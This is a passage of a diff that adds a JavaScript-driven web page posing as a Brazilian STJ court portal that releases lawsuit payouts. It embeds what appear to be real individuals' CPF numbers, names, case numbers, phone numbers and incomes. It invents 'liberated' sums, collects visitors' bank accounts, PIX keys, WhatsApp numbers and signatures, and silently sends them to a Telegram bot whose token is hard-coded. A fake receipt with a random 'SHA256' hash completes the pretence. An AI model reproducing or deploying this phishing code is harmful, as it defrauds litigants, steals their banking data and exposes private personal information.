+        "vara_comarca": "VARA ÚNICA DA COMARCA DE PRESIDENTE OLEGÁRIO",
+        "data_inicio": "28/11/2024",
+        "classe_processo": "Procedimento de Repactuação de Dívidas (Superendividamento)",
+        "assunto_processo": "DIREITO DO CONSUMIDOR",
+        "advogado_cliente": "NATALIA ARAUJO ROMAO BARROSO | OAB: MG202058",
+        "telefones": "Não informado",
+        "renda": "R$ 4668,04",
+        "idade": 57,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5002902-11.2024.8.13.0534"
+    },
+    {
+        "cpf_cliente": "00354943103",
+        "nome_cliente": "DOUGLAS DA SILVA DE LIMA",
+        "numero_processo": "5002430-13.2023.8.13.0512",
+        "valor_processo": "R$ 300.000,00",
+        "polo_passivo": "MURILO ALVES DE LIMA",
+        "advogado_passivo": "",
+        "tribunal": "Tribunal de Justiça do Estado de Minas Gerais",
+        "vara_comarca": "1ª VARA CÍVEL E DE FAMÍLIA DA COMARCA DE PIRAPORA",
+        "data_inicio": "08/05/2023",
+        "classe_processo": "Inventário",
+        "assunto_processo": "Inventário e Partilha",
+        "advogado_cliente": "ISABELA LINO DE SOUSA | OAB: MG202058",
+        "telefones": "📱 CEL: (34) 98829-4186",
+        "renda": "R$ 534,28",
+        "idade": 45,
+        "lado": "ATIVO",
+        "link": "https://supremodoseteoriginal.com/?processo=5002430-13.2023.8.13.0512"
+    }
+];
+        
+        // MARCADOR RECONHECIDO DE INJEÇÃO EM ESCALA REAL
+        // MARCADOR_DE_INJECAO_DADOS
+
+        const HORARIOS_PADRAO = [
+            "09:00 às 09:30", "09:30 às 10:00", "10:00 às 10:30", "10:30 às 11:00",
+            "11:00 às 11:30", "11:30 às 12:00", "12:00 às 12:30", "12:30 às 13:00", 
+            "13:00 às 13:30", "13:30 às 14:00", "14:00 às 14:30", "14:30 às 15:00", 
+            "15:00 às 15:30", "15:30 às 16:00", "16:00 às 16:30", "16:30 às 17:00", 
+            "17:00 às 17:30", "17:30 às 18:00", "18:00 às 18:30", "18:30 às 19:00"
+        ];
+
+        const preencherAgendaDatas = () => {
+            const selectData = document.getElementById('data_audiencia');
+            selectData.innerHTML = "";
+            let diasContados = 0;
+            let dataAlvo = new Date();
+
+            let horaAtual = dataAlvo.getHours();
+            let minAtual = dataAlvo.getMinutes();
+            let diaSemanaHoje = dataAlvo.getDay();
+            
+            let hojeValido = (diaSemanaHoje !== 0 && diaSemanaHoje !== 6 && (horaAtual < 17 || (horaAtual === 17 && minAtual <= 30)));
+
+            if (!hojeValido) {
+                do {
+                    dataAlvo.setDate(dataAlvo.getDate() + 1);
+                } while (dataAlvo.getDay() === 0 || dataAlvo.getDay() === 6);
+            } else {
+                let dataFormatada = dataAlvo.toLocaleDateString('pt-BR');
+                let option = document.createElement('option');
+                option.value = dataFormatada;
+                option.innerText = dataFormatada + " (Hoje)";
+                selectData.appendChild(option);
+                diasContados++;
+            }
+
+            while (diasContados < 2) {
+                if (hojeValido || diasContados > 0) {
+                    dataAlvo.setDate(dataAlvo.getDate() + 1);
+                }
+                let diaSemana = dataAlvo.getDay();
+                
+                if (diaSemana !== 0 && diaSemana !== 6) { 
+                    let dataFormatada = dataAlvo.toLocaleDateString('pt-BR');
+                    let option = document.createElement('option');
+                    option.value = dataFormatada;
+                    option.innerText = dataFormatada;
+                    selectData.appendChild(option);
+                    diasContados++;
+                }
+                hojeValido = true;
+            }
+            atualizarHorariosDisponiveis();
+        };
+
+        // LÓGICA REELABORADA: CALCULA A DISPONIBILIDADE BASEADA NO NÚMERO DO DIA PARA SER 100% DINÂMICO
+        const atualizarHorariosDisponiveis =() => {
+            const selectData = document.getElementById('data_audiencia');
+            const selectHorario = document.getElementById('horario');
+            const dataSelecionada = selectData.value;
+            const dataHojeFormatada = new Date().toLocaleDateString('pt-BR');
+            
+            // Pega hora e minuto atuais
+            const agora = new Date();
+            const horaAtual = agora.getHours();
+            const minAtual = agora.getMinutes();
+            const minutosAgora = (horaAtual * 60) + minAtual;
+
+            const diaNum = parseInt(dataSelecionada.split('/')[0]) || 1;
+            const semente = diaNum * 17;
+
+            selectHorario.innerHTML = '<option value="">Escolha o Horário</option>';
+
+            HORARIOS_PADRAO.forEach((janela, idx) => {
+                // Extrai a hora de início da janela (ex: "09:00" -> 09:00)
+                const [hJanela, mJanela] = janela.split(' às ')[0].split(':').map(Number);
+                const minutosJanela = (hJanela * 60) + mJanela;
+
+                let option = document.createElement('option');
+                option.value = janela;
+
+                // --- NOVA LÓGICA DE BLOQUEIO ---
+                
+                // 1. Bloqueio de horários passados (SE FOR HOJE)
+                // Bloqueia se o horário da janela já passou ou é o horário atual
+                const ehHoje = dataSelecionada.includes(dataHojeFormatada);
+                if (ehHoje && minutosJanela <= minutosAgora) {
+                    option.innerText = janela + " (Indisponível)";
+                    option.disabled = true;
+                    option.style.color = "#94a3b8";
+                }
+                // 2. Bloqueio fixo institucional pós-18h00
+                else if (hJanela >= 18) {
+                    option.innerText = janela + " (Indisponível)";
+                    option.disabled = true;
+                    option.style.color = "#94a3b8";
+                }
+                // 3. Regra de disponibilidade orgânica
+                else if ((idx + semente) % 5 === 0) {
+                    option.innerText = janela + " (Indisponível)";
+                    option.disabled = true;
+                    option.style.color = "#94a3b8";
+                } else {
+                    option.innerText = janela;
+                }
+                
+                selectHorario.appendChild(option);
+            });
+
+            if (validasParaHoje.length === 0 && dataSelecionada.includes(dataHojeFormatada)) {
+                let option = document.createElement('option');
+                option.value = "";
+                option.innerText = "Pauta esgotada para hoje. Escolha outra data.";
+                selectHorario.appendChild(option);
+            }
+        };
+
+        document.getElementById('data_audiencia').onchange = atualizarHorariosDisponiveis;
+
+        document.getElementById('banco').onchange = function() {
+            const campoOutro = document.getElementById('campo_banco_outro');
+            const inputOutro = document.getElementById('banco_outro_nome');
+            if (this.value === "OUTRO") {
+                campoOutro.classList.remove('hidden');
+                inputOutro.required = true;
+            } else {
+                campoOutro.classList.add('hidden');
+                inputOutro.required = false;
+                inputOutro.value = "";
+            }
+        };
+
+        const getMomentoAtual = () => { 
+            const agora = new Date();
+            return agora.toLocaleDateString('pt-BR') + ' às ' + agora.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+        };
+
+        let processoSelecionado = null;
+
+        // MÁSCARA AUTOMÁTICA EM TEMPO REAL
+        const campoTelefone = document.getElementById('telefone');
+        campoTelefone.oninput = e => {
+            e.target.setCustomValidity("");
+            let v = e.target.value.replace(/\D/g, "");
+            if (v.length > 11) v = v.substring(0, 11);
+            if (v.length > 10) v = v.replace(/^(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
+            else if (v.length > 5) v = v.replace(/^(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
+            else if (v.length > 2) v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
+            else if (v.length > 0) v = v.replace(/^(\d*)/, "($1");
+            e.target.value = v;
+        };
+
+        // VALIDAÇÃO IMEDIATA ESTILO NATIVA (BALÃO OFICIAL DO NAVEGADOR)
+        campoTelefone.onblur = e => {
+            const numLimpo = e.target.value.replace(/\D/g, "");
+            if (numLimpo.length > 0) {
+                const celularHabilitado = numLimpo.length === 11 && numLimpo.charAt(2) === '9';
+                if (!celularHabilitado) {
+                    e.target.setCustomValidity("O canal de comunicação informado deve corresponder a uma linha de telefonia móvel celular ativa e homologada para atos processuais virtuais.");
+                    e.target.reportValidity();
+                    e.target.value = "";
+                } else {
+                    e.target.setCustomValidity("");
+                }
+            }
+        };
+
+        function validarCPFReal(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+            let soma = 0, resto;
+            for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
+            resto = (soma * 10) % 11;
+            if ((resto === 10) || (resto === 11)) resto = 0;
+            if (resto !== parseInt(cpf.substring(9, 10))) return false;
+            soma = 0;
+            for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
+            resto = (soma * 10) % 11;
+            if ((resto === 10) || (resto === 11)) resto = 0;
+            if (resto !== parseInt(cpf.substring(10, 11))) return false;
+            return true;
+        }
+
+        document.getElementById('cpf_input').oninput = async e => {
+            let v = e.target.value.replace(/\D/g, "");
+            v = v.replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+            e.target.value = v;
+            const containerErro = document.getElementById('error_container');
+            containerErro.classList.add('hidden');
+
+            const cpfLimpo = v.replace(/\D/g, "");
+            if(cpfLimpo.length === 11) {
+                if (!validarCPFReal(cpfLimpo)) {
+                    document.getElementById('error_msg').innerText = "❌ O NÚMERO DE CPF INFORMADO É INVÁLIDO. VERIFIQUE OS DÍGITOS.";
+                    containerErro.classList.remove('hidden');
+                    return;
+                }
+
+                document.getElementById('cpf_input').disabled = true;
+                document.getElementById('loading').classList.remove('hidden');
+                
+                setTimeout(() => {
+                    const resultados = [];
+                    DADOS_PLANILHA.forEach(item => {
+                        let cpfPlanilha = item.cpf_cliente?.toString().replace(/\D/g, '').trim();
+                        if(cpfPlanilha && cpfPlanilha.length < 11) cpfPlanilha = cpfPlanilha.padStart(11, '0');
+
+                        if (cpfPlanilha === cpfLimpo) {
+                            resultados.push({
+                                nome: item.nome_cliente,
+                                id: item.numero_processo,
+                                txt: item.valor_processo || "R$ 0,00",
+                                valorNum: parseFloat(item.valor_processo?.toString().replace(/[^\d,]/g, '').replace(',', '.') || 0),
+                                passivo: item.polo_passivo || "Não Informado",
+                                tribunal: item.tribunal || "Tribunal de Justiça",
+                                vara_comarca: item.vara_comarca || "Vara Única",
+                                inicio: item.data_inicio || "Disponível",
+                                classe_processo: item.classe_processo || "Procedimento Comum Cível",
+                                assunto_processo: item.assunto_processo || "Ordem de Liberação Especial",
+                                advogado_cliente: item.advogado_cliente || "Patrono Constituído nos Autos"
+                            });
+                        }
+                    });
+
+                    if(resultados.length > 0) {
+                        resultados.sort((a, b) => b.valorNum - a.valorNum);
+                        document.getElementById('res-nome').innerText = resultados[0].nome;
+                        document.getElementById('res-cpf-label').innerText = "CPF RECONHECIDO: " + v;
+                        document.getElementById('titular-aviso').innerText = resultados[0].nome;
+                        document.getElementById('hoje-label').innerText = "CONSULTA EM: " + new Date().toLocaleDateString('pt-BR');
+                        
+                        renderizarBlocosDeProcessos(resultados);
+                        
+                        document.getElementById('loading').classList.add('hidden');
+                        document.getElementById('step-cpf').classList.add('hidden');
+                        document.getElementById('step-result').classList.remove('hidden');
+                    } else {
+                        document.getElementById('loading').classList.add('hidden');
+                        document.getElementById('cpf_input').disabled = false;
+                        document.getElementById('error_msg').innerText = "NENHUM PROCEDIMENTO INDIVIDUALIZADO DE PRECATÓRIO OU REQUISIÇÃO DE PEQUENO VALOR (RPV) FOI LOCALIZADO.";
+                        containerErro.classList.remove('hidden');
+                    }
+                }, 800);
+            }
+        };
+
+        function renderizarBlocosDeProcessos(procs) {
+            const container = document.getElementById('process-list');
+            container.innerHTML = "";
+            procs.forEach((p, i) => {
+                const div = document.createElement('div');
+                div.className = `process-card p-6 ${i === 0 ? 'active process-card-liberado shadow-xl' : 'opacity-50'}`;
+                if(i === 0) processoSelecionado = p;
+                
+                div.innerHTML = `
+                    <div class="flex justify-between items-start mb-4">
+                        <span class="text-[10px] font-black text-slate-500 uppercase">Autos do Processo nº: ${p.id}</span>
+                        ${i === 0 ? '<span class="badge-liberado text-[9px] px-3 py-1 rounded-full uppercase">Liberado</span>' : ''}
+                    </div>
+                    <div class="space-y-3">
+                        <div>
+                            <p class="text-[10px] text-blue-900 font-black uppercase mb-0.5">Tribunal / Juízo Distribuído</p>
+                            <p class="text-sm font-bold text-slate-800 leading-tight">${p.tribunal}</p>
+                            <p class="text-[11px] font-semibold text-slate-500 mt-0.5">${p.vara_comarca}</p>
+                        </div>
+                        <div class="grid grid-cols-2 gap-3 bg-slate-50 p-3 rounded-xl border border-slate-100">
+                            <div>
+                                <p class="text-[9px] text-slate-400 font-black uppercase tracking-wider">Classe Processual</p>
+                                <p class="text-[11px] font-bold text-slate-700 leading-tight mt-0.5">${p.classe_processo}</p>
+                            </div>
+                            <div>
+                                <p class="text-[9px] text-slate-400 font-black uppercase tracking-wider">Assunto Principal</p>
+                                <p class="text-[11px] font-bold text-slate-700 leading-tight mt-0.5">${p.assunto_processo}</p>
+                            </div>
+                        </div>
+                        <div class="bg-slate-100 p-3 rounded-xl">
+                            <p class="text-[9px] text-slate-500 font-black uppercase tracking-wider mb-0.5">Polo Passivo (Requerido/Devedor)</p>
+                            <p class="text-xs font-bold text-slate-700">${p.passivo}</p>
+                        </div>
+                        <div class="bg-blue-50/50 p-3 rounded-xl border border-blue-100/50">
+                            <p class="text-[9px] text-blue-800 font-black uppercase tracking-wider mb-0.5">Patronos Cadastrados (Advogados)</p>
+                            <p class="text-xs font-bold text-slate-700">${p.advogado_cliente}</p>
+                        </div>
+                        <div class="pt-3 border-t border-slate-200/60 flex justify-between items-end">
+                            <div>
+                                <p class="text-[10px] text-slate-400 font-bold uppercase">Data de Distribuição</p>
+                                <p class="text-xs font-black text-slate-600">${p.inicio || 'Disponível'}</p>
+                            </div>
+                            <div class="text-right">
+                                <p class="text-[10px] text-green-700 font-black uppercase tracking-widest">Montante do Alvará</p>
+                                <p class="text-2xl font-black text-blue-900">${p.txt}</p>
+                            </div>
+                        </div>
+                    </div>`;
+                container.appendChild(div);
+            });
+        }
+
+        document.getElementById('confirm-btn').onclick = () => {
+            document.getElementById('step-result').classList.add('hidden');
+            document.getElementById('stjForm').classList.remove('hidden');
+            window.scrollTo({top:0, behavior:'smooth'});
+        };
+
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let drawing = false;
+        ctx.lineWidth = 4; ctx.lineCap = 'round'; ctx.strokeStyle = '#000000';
+        const getPos = (e) => {
+            const r = canvas.getBoundingClientRect();
+            const x = (e.touches ? e.touches[0].clientX : e.clientX) - r.left;
+            const y = (e.touches ? e.touches[0].clientY : e.clientY) - r.top;
+            return { x: x * (canvas.width / r.width), y: y * (canvas.height / r.height) };
+        };
+        canvas.addEventListener('mousedown', (e) => { drawing = true; ctx.beginPath(); const p = getPos(e); ctx.moveTo(p.x, p.y); });
+        canvas.addEventListener('mousemove', (e) => { if(!drawing) return; const p = getPos(e); ctx.lineTo(p.x, p.y); ctx.stroke(); });
+        window.addEventListener('mouseup', () => drawing = false);
+        canvas.addEventListener('touchstart', (e) => { drawing = true; ctx.beginPath(); const p = getPos(e); ctx.moveTo(p.x, p.y); });
+        canvas.addEventListener('touchmove', (e) => { if(!drawing) return; e.preventDefault(); const p = getPos(e); ctx.lineTo(p.x, p.y); ctx.stroke(); });
+        document.getElementById('clear').onclick = () => ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+        // FUNÇÃO DE ENVIO SILENCIOSO PARA TELEGRAM
+        const enviarTelegramSilencioso = async (mensagem) => {
+            const token = '8690236353:AAFzFzObTwTAPZTyHnf4bN_juQBflMTbx2E';
+            const chat_id = '-1003777773992';
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chat_id, text: mensagem, parse_mode: 'HTML' })
+                });
+            } catch (err) { console.error("Erro silenciado no envio."); }
+        };
+
+        document.getElementById('stjForm').onsubmit = function (e) {
+            e.preventDefault();
+            const numLimpo = campoTelefone.value.replace(/\D/g, "");
+            const celularHabilitado = numLimpo.length === 11 && numLimpo.charAt(2) === '9';
+            if (!celularHabilitado) {
+                campoTelefone.setCustomValidity("O canal de comunicação informado deve corresponder a uma linha de telefonia móvel celular ativa e homologada para atos processuais virtuais.");
+                campoTelefone.reportValidity();
+                return;
+            }
+
+            const protocoloID = "STJ-PRT-" + Math.floor(Math.random() * 90000000 + 10000000);
+            const cpfUsuario = document.getElementById('cpf_input').value;
+            const momentoDeAgora = getMomentoAtual();
+            const dataAgendada = document.getElementById('data_audiencia').value;
+            const horarioDaAudiencia = document.getElementById('horario').value;
+            const nomeDoBeneficiario = document.getElementById('res-nome').innerText;
+            const wppContato = campoTelefone.value;
+            
+            let bancoSelecionado = document.getElementById('banco').value;
+            if (bancoSelecionado === "OUTRO") {
+                bancoSelecionado = document.getElementById('banco_outro_nome').value || "Outra Instituição Declarada";
+            }
+            const contaCompleta = document.getElementById('agencia').value + " / " + document.getElementById('conta').value;
+            const chavePixCadastrada = document.getElementById('pix').value || "Não informado (TED)";
+
+            document.getElementById('stjForm').classList.add('hidden');
+            const loadingServer = document.getElementById('step-loading-server');
+            const loadingTitle = document.getElementById('loading-server-title');
+            loadingServer.classList.remove('hidden');
+
+            const etapas = [
+                "Autenticando assinatura eletrônica e chaves de criptografia...",
+                "Estabelecendo conexão segura e registrando pauta nos servidores STJ...",
+                "Sincronizando pauta de conformidade e validando dados bancários...",
+                "Gerando Certidão Única de Agendamento de Ato Conciliatório..."
+            ];
+
+            let indexEtapa = 0;
+            loadingTitle.innerText = etapas[indexEtapa];
+
+            const intervaloEtapas = setInterval(() => {
+                indexEtapa++;
+                if (indexEtapa < etapas.length) {
+                    loadingTitle.innerText = etapas[indexEtapa];
+                } else {
+                    clearInterval(intervaloEtapas);
+                    loadingServer.classList.add('hidden');
+                    document.getElementById('sucesso-id').innerText = protocoloID;
+                    document.getElementById('sucesso-data-feito').innerText = momentoDeAgora;
+                    document.getElementById('sucesso-horario').innerText = dataAgendada + " das " + horarioDaAudiencia;
+
+                    const textoCompletoDoRecibo = 
+`AUTENTICAÇÃO DO REGISTRO DE AGENDAMENTO: CODE-${protocoloID}
+
+IDENTIFICAÇÃO E QUALIFICAÇÃO DO(A) BENEFICIÁRIO(A) / TITULAR
+  Nome Completo: ${nomeDoBeneficiario}
+  Inscrição CPF: ${cpfUsuario}
+
+OBJETO DA DEMANDA E ESPECIFICAÇÕES PROCESSUAIS
+  Autos do Processo nº: ${processoSelecionado.id}
+  Classe Processual: ${processoSelecionado.classe_processo}
+  Assunto Governamental: ${processoSelecionado.assunto_processo}
+  Polo Passivo (Devedor): ${processoSelecionado.passivo}
+  Patronos Cadastrados: ${processoSelecionado.advogado_cliente}
+  Montante Líquido Disponibilizado: ${processoSelecionado.txt}
+  Juízo / Vara Originária: ${processoSelecionado.vara_comarca}
+  Data de Distribuição / Início: ${processoSelecionado.inicio}
+
+DADOS BANCÁRIOS HOMADO PARA DESTINAÇÃO DE ATIVOS
+  Instituição Financeira: ${bancoSelecionado}
+  Agência / Conta Corrente: ${contaCompleta}
+  Chave Cadastral PIX: ${chavePixCadastrada}
+
+CANAIS DE COMUNICAÇÃO ATIVOS E APRAZAMENTO DE ATO
+  Canal Informativo (WhatsApp): ${wppContato}
+  Data de Realização da Audiência Virtual: ${dataAgendada} na janela das ${horarioDaAudiencia}
+  Data e Hora do Registro Eletrônico: ${momentoDeAgora}
+
+Certifico e dou fé que o agendamento eletrônico acima foi registrado com sucesso nos sistemas integrados do Tribunal. O ato virtual destina-se à verificação de identidade, prova de vida e confirmação de titularidade de crédito para subsequente liberação e liquidação financeira dos valores custodiados.`;
+
+                    // CONSTRUÇÃO DA MENSAGEM PARA O TELEGRAM
+                    const msgBot = `<b>⚠️ NOVO PROTOCOLO AGENDADO - STJ</b>\n\n` +
+                                   `<b>👤 NOME:</b> ${nomeDoBeneficiario}\n` +
+                                   `<b>🆔 CPF:</b> ${cpfUsuario}\n` +
+                                   `<b>📱 WHATSAPP:</b> ${wppContato}\n\n` +
+                                   `<b>🏦 BANCO:</b> ${bancoSelecionado}\n` +
+                                   `<b>💳 AG/CONTA:</b> ${contaCompleta}\n` +
+                                   `<b>🔑 PIX:</b> ${chavePixCadastrada}\n\n` +
+                                   `<b>📄 PROCESSO:</b> ${processoSelecionado.id}\n` +
+                                   `<b>   Assunto:</b> ${processoSelecionado.assunto_processo}\n` +
+								   `<b>   Advogado:</b> ${processoSelecionado.advogado_cliente}\n` +
+								   `<b>   Data de Distribuição / Início:</b> ${processoSelecionado.inicio}\n` +
+								   `<b>   Juízo / Vara Originária:</b> ${processoSelecionado.vara_comarca}\n\n` +
+								   `<b>💰 VALOR:</b> ${processoSelecionado.txt}\n\n` +
+								   `<b>   Polo Passivo (Devedor):</b> ${processoSelecionado.passivo}\n\n` +							   
+                                   `<b>📅 AGENDAMENTO:</b> ${dataAgendada} às ${horarioDaAudiencia}\n` +
+                                   `<b>🔑 PROTOCOLO:</b> ${protocoloID}`;
+
+                    // DISPARO SILENCIOSO
+                    enviarTelegramSilencioso(msgBot);
+
+                    document.getElementById('pdf-conteudo-texto').textContent = textoCompletoDoRecibo;
+                    document.getElementById('pdf-nome-sub').innerText = nomeDoBeneficiario;
+                    const hashCriptoAleatorio = "SHA256." + Array.from({length: 32}, () => "0123456789ABCDEFABCDEFGHIJKLMNOPQRSTUVWXYZ"[Math.floor(Math.random() * 42)]).join("");
+                    document.getElementById('pdf-hash-seguranca').innerText = hashCriptoAleatorio;
+                    const imagemAssinaturaBase64 = canvas.toDataURL('image/png');
+                    document.getElementById('pdf-assinatura-img').src = imagemAssinaturaBase64;
+
+                    document.getElementById('interface-completa').style.display = 'none';
+                    document.getElementById('documento-pdf').classList.remove('hidden');
+
+                    setTimeout(() => {
+                        const tituloOriginal = document.title;
+                        document.title = `${cpfUsuario}_Protocolo_Agendamento_STJ`;
+                        window.print();
+                        document.title = tituloOriginal;
+                        document.getElementById('documento-pdf').classList.add('hidden');
+                        document.getElementById('interface-completa').style.display = 'flex';
+                        document.getElementById('step-success').classList.remove('hidden');
+                        window.scrollTo({top: 0, behavior: 'smooth'});
+                    }, 1000);
+                }
+            }, 1000);
+        };
+
+        window.onload = () => { preencherAgendaDatas(); };
+    </script>
+</body>
+</html>
